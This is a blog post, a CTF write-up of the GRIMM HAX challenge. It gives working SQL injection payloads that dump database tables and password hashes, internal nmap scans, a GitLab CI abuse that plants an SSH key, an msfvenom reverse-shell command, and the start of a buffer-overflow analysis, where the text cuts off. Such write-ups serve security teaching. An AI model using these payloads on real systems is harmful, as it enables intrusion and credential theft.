<!DOCTYPE html><html lang="en-US" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content=""><meta name="hour-prompt" content=""><meta name="minute-prompt" content=""><meta name="justnow-prompt" content=""><meta name="generator" content="Jekyll v4.3.2" /><meta property="og:title" content="GRIMM HAX Combined Challenge" /><meta name="author" content="Duc Phan" /><meta property="og:locale" content="en_US" /><meta name="description" content="This is the write-up for challenges I have done GRIMM HAX challenge." /><meta property="og:description" content="This is the write-up for challenges I have done GRIMM HAX challenge." /><link rel="canonical" href="https://ret2.life/posts/GRIMM-HAX-Combined-Challenge/" /><meta property="og:url" content="https://ret2.life/posts/GRIMM-HAX-Combined-Challenge/" /><meta property="og:site_name" content="ret2life" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2018-05-23T03:08:38+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="GRIMM HAX Combined Challenge" /><meta name="twitter:site" content="@flyingpassword" /><meta name="twitter:creator" content="@Duc Phan" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Duc Phan"},"dateModified":"2018-05-23T03:08:38+08:00","datePublished":"2018-05-23T03:08:38+08:00","description":"This is the write-up for challenges I have done GRIMM HAX challenge.","headline":"GRIMM HAX Combined Challenge","mainEntityOfPage":{"@type":"WebPage","@id":"https://ret2.life/posts/GRIMM-HAX-Combined-Challenge/"},"url":"https://ret2.life/posts/GRIMM-HAX-Combined-Challenge/"}</script><title>GRIMM HAX Combined Challenge | ret2life</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="ret2life"><meta name="application-name" content="ret2life"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang=""><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="https://pbs.twimg.com/profile_images/1417881771534819331/0AuUptMd_400x400.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">ret2life</a></div><div class="site-subtitle font-italic">From CTF write-ups to everyday life kind of things</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span></span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/ducphanduyagentp" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/flyingpassword" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['youreallythingimmaputemail','on.here?'].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> </a> </span> <span>GRIMM HAX Combined Challenge</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" ></span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>GRIMM HAX Combined Challenge</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Duc Phan </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="2018-05-23 03:08:38 +0800" >2018-05-23 03:08:38 +0800<i class="unloaded">2018-05-23T03:08:38+08:00</i> </span></div><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="4457 ">24 </span></div></div><div class="post-content"><p>This is the write-up for challenges I have done GRIMM HAX challenge.</p><h2 id="welcome-bobby-100pts">Welcome, Bobby (100pts)</h2><p>Accessing the website at http://www.haxcorp.grimm-co.com/, we are provided with a login page with username as password. The objective of this level is to login as admin. Seeing this as a warmup level, I immediately try the following classic SQL injection</p><p><img data-proofer-ignore data-src="/assets/img/GRIMM-hax-combined/1.png" alt="100-sql-injection" /></p><p>And we are in. The flag is <code class="language-plaintext highlighter-rouge">GRIMM-BOBBY-TABLES-WOULD-BE-PROUD</code>.</p><p><img data-proofer-ignore data-src="/assets/img/GRIMM-hax-combined/2.png" alt="100-logged-in" /></p><h2 id="oh-how-the-tables-have-turned-100pts">Oh How the Tables have Turned (100pts)</h2><p>From the description of the challenge, I predicted that this is another SQL injection to find the flag in a different table in the database, especially when we are presented with a search functionality. Testing out the searchbox with a single quote yielded an error.</p><p><img data-proofer-ignore data-src="/assets/img/GRIMM-hax-combined/3.png" alt="100-sql-injection-2" /></p><p>From this error, we acknowledge that this is a MySQL database. An attack that I could think of at that moment is to use UNION-based SQL injection to gradually figure out the structure of the database and find out where the flag is in the database. One reason of using this type of SQL-injection is because the number of selected columns might have been known from the result table in the application (3 in this case). In UNION-based SQL-injection, the number of columns selected in the queries has to be the same.</p><p>First, let’s try to figure out all the database existed in the MySQL instance by reading the information_schema database. This database contains many useful information about the instance itself and from there, we can figure out the structure of the database.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Plaintext "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>' UNION SELECT schema_name, 2, 3 from information_schema.schemata;#
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/img/GRIMM-hax-combined/4.PNG" alt="100-union-1" /></p><p>The next step is to checkout all the table in interesting databases that we see from here. I am going to checkout the <code class="language-plaintext highlighter-rouge">GRIMM</code> database in this case.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Plaintext "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>' UNION SELECT table_name, table_schema, 3 from information_schema.tables WHERE table_schema = 'GRIMM';#
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/img/GRIMM-hax-combined/5.PNG" alt="100-union-2" /></p><p>From this result, we can kinda know that the flag will be in the table <code class="language-plaintext highlighter-rouge">flags</code> from the database <code class="language-plaintext highlighter-rouge">GRIMM</code>. Let’s checkout all the columns in that table.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Plaintext "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>' UNION SELECT table_name, column_name, 3 from information_schema.columns WHERE table_name = 'flags';#
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/img/GRIMM-hax-combined/6.PNG" alt="100-union-3" /></p><p>There are 2 columns in this table namely <code class="language-plaintext highlighter-rouge">id</code> and <code class="language-plaintext highlighter-rouge">flag</code>. Let’s select all the data in this table to obtain the flag.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Plaintext "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>' UNION SELECT id, flag, 1337 FROM GRIMM.flags;#
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/img/GRIMM-hax-combined/7.PNG" alt="100-union-4" /></p><p>And the flag is <code class="language-plaintext highlighter-rouge">GRIMM-SQL-INJECT</code>.</p><h2 id="protected-files-200pts">Protected Files (200pts)</h2><p>This is the next level that we need to solve in order to progress. The objective is to get access to an FTP server to retrieve the VPN configuration as suggested by the hint from another challenge. Let’s proceed using the same SQL-injection strategy as the last level. In this level, the <code class="language-plaintext highlighter-rouge">vsftpd</code> database is the target. The other FTP-related database <code class="language-plaintext highlighter-rouge">vsftp</code> is empty.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Plaintext "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>' UNION SELECT table_name, table_schema, 3 from information_schema.tables WHERE table_schema = 'vsftpd';#
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/img/GRIMM-hax-combined/8.PNG" alt="200-ftp-1" /></p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Plaintext "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>' UNION SELECT table_name, column_name, 3 from information_schema.columns WHERE table_name = 'accounts';#
</pre></table></code></div></div><p><img data-proofer-ignore data-src="/assets/img/GRIMM-hax-combined/9.PNG" alt="200-ftp-2" /></p><p>Note that there are some column names that do not belong to the target <code class="language-plaintext highlighter-rouge">accounts</code> table because there are other tables of the same name in the database. However, this is good enough as we can see the interesting <code class="language-plaintext highlighter-rouge">username</code> and <code class="language-plaintext highlighter-rouge">pass</code> columns.</p><p><img data-proofer-ignore data-src="/assets/img/GRIMM-hax-combined/10.PNG" alt="200-ftp-3" /></p><p>Let’s plug all the hashes into a website to crack them.</p><p><img data-proofer-ignore data-src="/assets/img/GRIMM-hax-combined/11.PNG" alt="200-ftp-4" /></p><p>Let’s connect to the FTP server on the same host and try to login with the visible creds.</p><p><img data-proofer-ignore data-src="/assets/img/GRIMM-hax-combined/12.PNG" alt="200-ftp-5" /></p><p>This is the VPN configuration to connects to the internal infrastructure. The flag is in <code class="language-plaintext highlighter-rouge">management.ovpn</code></p><p><img data-proofer-ignore data-src="/assets/img/GRIMM-hax-combined/13.PNG" alt="200-ftp-6" /></p><p>The flag is <code class="language-plaintext highlighter-rouge">GRIMM-PEEKIN-IN-YO-NETWORK</code>.</p><h2 id="enumeration-of-the-internal-infrastructure">Enumeration of the internal infrastructure</h2><p>From this level and on, we need to connect to the internal infrastructure using the obtained VPN configuration.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Plaintext "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>openvpn --config management.ovpn
</pre></table></code></div></div><p>After connected to the internal network, let’s take a look at some network information to get to know the subnets in the scope. From the output of OpenVPN, I noticed some subnets:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Plaintext "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>Fri May 25 22:39:11 2018 /sbin/ip addr add dev tun0 local 10.8.0.10 peer 10.8.0.9
Fri May 25 22:39:11 2018 /sbin/ip route add 10.123.14.0/24 via 10.8.0.9
Fri May 25 22:39:11 2018 /sbin/ip route add 10.123.15.0/24 via 10.8.0.9
Fri May 25 22:39:11 2018 /sbin/ip route add 10.8.0.1/32 via 10.8.0.9
</pre></table></code></div></div><p>The client machine is on the 10.8.0.0 network so I assumed that the target networks are <code class="language-plaintext highlighter-rouge">10.123.14.0/24</code> and <code class="language-plaintext highlighter-rouge">10.123.15.0/24</code>. Let’s have an initial enumeration of those network using a ping scan. Note that there might have been non-pingable machines at this point.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Plaintext "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre>➜  grimm git:(master) ✗ nmap -sn 10.123.14.0/24 

Starting Nmap 7.60 ( https://nmap.org ) at 2018-05-25 22:43 EDT
Nmap scan report for 10.123.14.10
Host is up (0.072s latency).
Nmap scan report for 10.123.14.12
Host is up (0.042s latency).
Nmap scan report for 10.123.14.122
Host is up (0.044s latency).
Nmap done: 256 IP addresses (3 hosts up) scanned in 7.63 seconds
➜  grimm git:(master) ✗ nmap -sn 10.123.15.0/24  

Starting Nmap 7.60 ( https://nmap.org ) at 2018-05-25 22:43 EDT
Nmap scan report for 10.123.15.10
Host is up (0.044s latency).
Nmap scan report for 10.123.15.15
Host is up (0.063s latency).
Nmap scan report for 10.123.15.20
Host is up (0.039s latency).
Nmap scan report for 10.123.15.53
Host is up (0.040s latency).
Nmap done: 256 IP addresses (4 hosts up) scanned in 5.08 seconds
</pre></table></code></div></div><p>Let’s next scan the common ports on those hosts.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Plaintext "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
</pre><td class="rouge-code"><pre>➜  grimm git:(master) ✗ nmap -v -sV -iL hosts.txt   

Starting Nmap 7.60 ( https://nmap.org ) at 2018-05-25 22:47 EDT
NSE: Loaded 42 scripts for scanning.
Initiating Ping Scan at 22:47
Scanning 7 hosts [4 ports/host]
Completed Ping Scan at 22:47, 0.08s elapsed (7 total hosts)
Initiating Parallel DNS resolution of 7 hosts. at 22:47
Completed Parallel DNS resolution of 7 hosts. at 22:47, 0.03s elapsed
Initiating SYN Stealth Scan at 22:47
Scanning 7 hosts [1000 ports/host]
Discovered open port 3389/tcp on 10.123.15.10
Discovered open port 22/tcp on 10.123.14.12
Discovered open port 139/tcp on 10.123.15.10
Discovered open port 445/tcp on 10.123.15.10
Discovered open port 135/tcp on 10.123.15.10
Discovered open port 80/tcp on 10.123.14.10
Discovered open port 53/tcp on 10.123.15.10
Discovered open port 593/tcp on 10.123.15.10
Discovered open port 636/tcp on 10.123.15.10
Discovered open port 3269/tcp on 10.123.15.10
Discovered open port 389/tcp on 10.123.15.10
Discovered open port 464/tcp on 10.123.15.10
Discovered open port 88/tcp on 10.123.15.10
Discovered open port 3268/tcp on 10.123.15.10
Completed SYN Stealth Scan against 10.123.15.10 in 24.85s (6 hosts left)
Completed SYN Stealth Scan against 10.123.14.12 in 25.23s (5 hosts left)
Completed SYN Stealth Scan against 10.123.14.122 in 25.44s (4 hosts left)
Completed SYN Stealth Scan against 10.123.14.10 in 25.49s (3 hosts left)
Completed SYN Stealth Scan against 10.123.15.15 in 25.63s (2 hosts left)
Completed SYN Stealth Scan against 10.123.15.20 in 25.72s (1 host left)
Completed SYN Stealth Scan at 22:48, 25.82s elapsed (7000 total ports)
Initiating Service scan at 22:48
Scanning 14 services on 7 hosts
Completed Service scan at 22:48, 11.17s elapsed (14 services on 7 hosts)
NSE: Script scanning 7 hosts.
Initiating NSE at 22:48
Completed NSE at 22:48, 0.38s elapsed
Initiating NSE at 22:48
Completed NSE at 22:48, 0.18s elapsed
Nmap scan report for 10.123.15.10
Host is up (0.042s latency).
Not shown: 988 filtered ports
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Microsoft DNS
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2018-05-26 02:48:53Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: corp.hax, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: CORP)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: corp.hax, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows

Nmap scan report for 10.123.15.15
Host is up (0.042s latency).
All 1000 scanned ports on 10.123.15.15 are filtered

Nmap scan report for 10.123.15.20
Host is up (0.043s latency).
All 1000 scanned ports on 10.123.15.20 are filtered

Nmap scan report for 10.123.15.53
Host is up (0.043s latency).
All 1000 scanned ports on 10.123.15.53 are filtered

Nmap scan report for 10.123.14.10
Host is up (0.044s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx

Nmap scan report for 10.123.14.12
Host is up (0.041s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap scan report for 10.123.14.122
Host is up (0.043s latency).
All 1000 scanned ports on 10.123.14.122 are filtered

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 7 IP addresses (7 hosts up) scanned in 38.71 seconds
           Raw packets sent: 14052 (618.172KB) | Rcvd: 74 (3.144KB)
</pre></table></code></div></div><h2 id="git-your-daily-news-100pts">Git Your Daily News (100pts)</h2><p>From the initial enumeration result, I tried to access the web server on <code class="language-plaintext highlighter-rouge">10.123.14.10</code> and fortunately it is the GitLab server that I needed to find. The flag is <code class="language-plaintext highlighter-rouge">GRIMM-GIT-GUD-SUN</code>.</p><p><img data-proofer-ignore data-src="/assets/img/GRIMM-hax-combined/14.PNG" alt="git-1" /></p><h2 id="pipeline-300pts">Pipeline (300pts)</h2><p>To access gitlab, register and login. I was a little bit lucky at this level because I was doing a class-project at the same time which involved continuous integration using Travis-CI, I knew that I need to somehow achieve code execution using continuous integration that comes with Gitlab. From <a href="https://docs.gitlab.com/ee/ci/quick_start/README.html">this documentation</a> from Gitlab, I created a project and commit a <code class="language-plaintext highlighter-rouge">.gitlab-ci.yml</code> file to execute command on the gitlab machine:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Plaintext "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>job1:
    script: "ls -la"
</pre></table></code></div></div><p>After committing the new file, the job defined in this configuration file was automatically run.</p><p><img data-proofer-ignore data-src="/assets/img/GRIMM-hax-combined/15.PNG" alt="gitlab-1" /></p><p>After testing out several commands for a while, I proceeded to obtaining an SSH-shell on the remote host by adding a bash script that writes my public key to ~/.ssh/authorized_keys. And there is our shell:</p><p><img data-proofer-ignore data-src="/assets/img/GRIMM-hax-combined/16.PNG" alt="gitlab-2" /> <img data-proofer-ignore data-src="/assets/img/GRIMM-hax-combined/17.PNG" alt="gitlab-3" /></p><p>The flag is <code class="language-plaintext highlighter-rouge">GRIMM-CONTINUOUS-PWNTEGRATION</code>. Note that the flag can be obtained just from using the configuration file to traverse the file system. However, I wanted to take this further so that I could explore the system more easily.</p><p>To make persistent and pivoting easier, I started a meterpreter shell on this machine and manage it using metasploit running on an AWS EC2 instance.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Plaintext "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;public-ip&gt; LPORT=4444 -f elf &gt; fpasswdpwn
</pre></table></code></div></div><h2 id="lister-400pts">Lister (400pts)</h2><p>This is definitely my favorite part of the challenge. Let’s first play with the binary a little bit to see what it was doing.</p><h3 id="discovery">Discovery</h3><p>Running the binary did not give any output.</p><p><img data-proofer-ignore data-src="/assets/img/GRIMM-hax-combined/35.PNG" alt="lister-1" /></p><p>Having done some CTFs that have this kind of binary, I was sure that it was running as a service listening for incoming connection. That was actually the case because we are trying to access a particular service on a remote machine. I did a <code class="language-plaintext highlighter-rouge">netstat</code> command to figure out on which port it was listening. It was port <code class="language-plaintext highlighter-rouge">12345</code>.</p><p><img data-proofer-ignore data-src="/assets/img/GRIMM-hax-combined/36.PNG" alt="lister-2" /></p><p>Connecting to the service using <code class="language-plaintext highlighter-rouge">nc</code>, we are prompted with a file listing program.</p><p><img data-proofer-ignore data-src="/assets/img/GRIMM-hax-combined/37.PNG" alt="lister-3" /></p><p>After that, I figured out the service was running on <code class="language-plaintext highlighter-rouge">10.123.15.53</code> by doing a connect scan from the gitlab-runner machine on the networks. The following asciinema record is me playing with the remote service. I did an SSH-portforward to get the service on <code class="language-plaintext highlighter-rouge">localhost:1234</code>.</p><script src="https://asciinema.org/a/184103.js" id="asciicast-184103" async=""></script><p>As you can see, the service did not work as intended all the time and sometime it would eat up the last character from the input (0:30). Let’s do some more work on the binary to figure out why that happenned.</p><h3 id="exploitation">Exploitation</h3><p>Let’s checkout the protection mechanisms of the binary to figure out possible approaches. I was using the <code class="language-plaintext highlighter-rouge">checksec</code> command comes with <code class="language-plaintext highlighter-rouge">pwntools</code>.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span text-data=" Plaintext "><i class="fa-fw fas fa-code small"></i></span> <button aria-label="copy" title-succeed=""><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>➜  grimm git:(master) ✗ file lister
lister: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.35, BuildID[sha1]=61ef9b28e166ee62f7241d920a1058974241d61b, not stripped
➜  grimm git:(master) ✗ checksec lister
[*] '/root/someWorkspace/workspace/ctfs/2018/grimm/grimm/lister'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
</pre></table></code></div></div><p>From this result. We can see that NX is disabled and there are RWX segments. Possible solutions may be the classic stack buffer overflow where data read to a buffer is executed. However, I still needed to find a way to bypass ASLR with the assumption that ASLR is enabled by default on the remote host. Let’s do some reverse engineering on the binary to gather some information.</p><p><img data-proofer-ignore data-src="/assets/img/GRIMM-hax-combined/38.PNG" alt="lister-4" /></p><p>Open the main function, we can see what was going on:</p><ul><li>The program listen on port 12345 and waiting for connection<li>Everytime a client connects to the program, it makes a fork and run the main functionality:<ul><li>Asking for a directory path to list all the files in there<li><strong>It receives at most <code class="language-plaintext highlighter-rouge">0x200</code> bytes of input for the path. However the buffer is only <code class="language-plaintext highlighter-rouge">0x140</code> byte-long. There is obviously a stack buffer-overflow here</strong><li>It replaces the character at <code class="language-plaintext highlighter-rouge">strlen(input)-2</code> with a NULL byte. This is why we see the last character being eaten up<li>It sends back the modified buffer to the client<li>It uses the <code class="language-plaintext highlighter-rouge">opendir</code> and <code class="language-plaintext highlighter-rouge">readdir</code> functions (in the <code class="language-plaintext highlighter-rouge">ls</code> function) to list files in the provided path. If the path is not a directory or any error happenned, the string “Directory does not exist.” is returned.<li>Note that in the main program, whenever it attempts to send data to the client, it uses the 